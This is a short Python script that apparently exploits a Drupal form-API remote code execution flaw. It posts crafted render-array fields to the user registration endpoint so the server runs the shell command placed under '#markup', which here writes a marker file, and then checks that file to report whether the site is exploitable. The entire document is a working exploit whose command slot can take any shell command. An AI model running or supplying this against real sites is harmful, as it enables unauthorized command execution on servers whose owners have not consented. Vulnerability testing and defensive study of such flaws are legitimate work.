#!/usr/bin/env
import sys
import requests

target = input("Input target URL (example: http://example.com/): ")

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = {}
verify = True

url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
payload = {
    'form_id':'user_register_form',
    '_drupal_ajax':'1',
    'mail[#post_render][]':'exec',
    'mail[#type]':'markup',
    'mail[#markup]':'echo ";-)" | tee hh.txt'    # command
}

res = requests.post(url=url, data=payload, proxies=proxies, verify=verify)
check = requests.get(url=target+"hh.txt")

if check.status_code !=200 :
    sys.exit("\nNot exploitable")

sys.exit("\nExploitable!\nCheck: "+target+"hh.txt")